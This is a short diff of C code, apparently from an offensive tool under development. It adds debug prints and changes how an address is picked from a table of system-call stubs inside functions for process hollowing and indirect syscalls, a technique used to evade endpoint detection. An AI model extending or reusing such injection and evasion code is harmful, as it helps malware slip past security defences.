@@ -181,6 +181,7 @@ BOOL hollowProcess(PROCESS_INFORMATION Pi, SIZE_T sPayload) {
     //BOOL result = NoahRead(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
     BOOL result = NoahRead2(Pi.hProcess, (LPCVOID)BaseAddress, procAddr, 64, &bytesRW);
     printf("Enging NoahRead\n");
+    printf("RESULTSS????? %d", result);
 
     printf("Proc Address: 0x%p", procAddr);
     getchar();
@@ -617,8 +618,12 @@ EXTERN_C PVOID* GetJMP() {
 
     //static uint64_t value =(uint64_t
    
-    uint64_t address = pSystemCalls[((DWORD)rand()) % sizeof(pSystemCalls)];
-    //PVOID address = (PVOID)(0xdeadbeef);
+    uint64_t address = pSystemCalls[rand() % (sizeof(pSystemCalls) / sizeof(pSystemCalls[0]))];    //PVOID address = (PVOID)(0xdeadbeef);
+    
+    //uint64_t address = pSystemCalls[200];
+    
+    //uint64_t* address = (uint64_t*)0x00007FF97312D232;
+
     printf("Getting JMP! 0x%p\n", address);
     gJMP = address;
     uint64_t address2 = (uint64_t)address;
@@ -627,12 +632,17 @@ EXTERN_C PVOID* GetJMP() {
     return &address2;
     //return &value;
 }
+
+
 EXTERN_C void UpdateGlobals(DWORD input) {
-    uint64_t address = pSystemCalls[((DWORD)rand()) % sizeof(pSystemCalls)];
+    //uint64_t address = pSystemCalls[rand() % (sizeof(pSystemCalls) / sizeof(pSystemCalls[0]))];    //PVOID address = (PVOID)(0xdeadbeef);
     //PVOID address = (PVOID)(0xdeadbeef);
+    uint64_t* address = (uint64_t*)0x00007FF97312D232;
+
     printf("Getting JMP! 0x%p\n", address);
     gJMP = address;
     uint64_t address2 = (uint64_t)address;
+    PULONG oldProts = NULL;
     getchar();
     printf("Input val to UpdateGloabls: %d\n", input);
     getchar();
